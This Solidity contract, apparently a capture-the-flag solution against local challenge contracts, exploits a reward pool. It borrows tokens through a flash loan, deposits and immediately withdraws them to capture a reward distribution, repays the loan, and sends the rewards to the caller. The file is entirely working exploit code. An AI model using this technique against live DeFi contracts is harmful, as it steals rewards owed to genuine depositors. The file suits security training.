// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";

contract TheRewarderAttack {
    using Address for address payable;
    FlashLoanerPool lender;
    TheRewarderPool rewarder;
    ERC20 liquidityToken;
    ERC20 rewardToken;

    function attack(FlashLoanerPool _lender,
                    TheRewarderPool _rewarder,
                    ERC20 _liquidityToken,
                    ERC20 _rewardToken,
                    uint256 amount) external
                    {
                        lender = _lender;
                        rewarder = _rewarder;
                        liquidityToken = _liquidityToken;
                        rewardToken = _rewardToken;
                        lender.flashLoan(amount);
                        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
                    }

    function receiveFlashLoan(uint256 amount) external
    {
        liquidityToken.approve(address(rewarder), amount);
        rewarder.deposit(amount);

        rewarder.withdraw(amount);
        liquidityToken.transfer(address(lender), amount);
    }
}
